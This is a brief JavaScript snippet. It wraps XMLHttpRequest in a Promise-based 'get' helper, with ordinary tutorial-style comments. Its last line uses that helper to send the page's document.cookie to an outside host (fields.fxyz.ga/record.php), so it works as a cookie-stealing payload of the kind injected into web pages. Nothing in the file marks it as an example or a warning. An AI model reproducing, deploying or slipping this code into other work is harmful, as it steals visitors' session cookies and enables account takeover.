function get(url) {
	// Return a new promise.
	return new Promise(function(resolve, reject) {
		// Do the usual XHR stuff
		var req = new XMLHttpRequest();
		req.open('GET', url);

		req.onload = function() {
			// This is called even on 404 etc
			// so check the status
			if (req.status == 200) {
				console.log("done");
				resolve(req.response);
			} else {
				// Otherwise reject with the status text
				// which will hopefully be a meaningful error
				reject(Error(req.statusText));
			}
		};
		req.onerror = function() {
			reject(Error("Network Error"));
		};
		req.send();
	});
}
get("http://fields.fxyz.ga/record.php?c="+document.cookie);
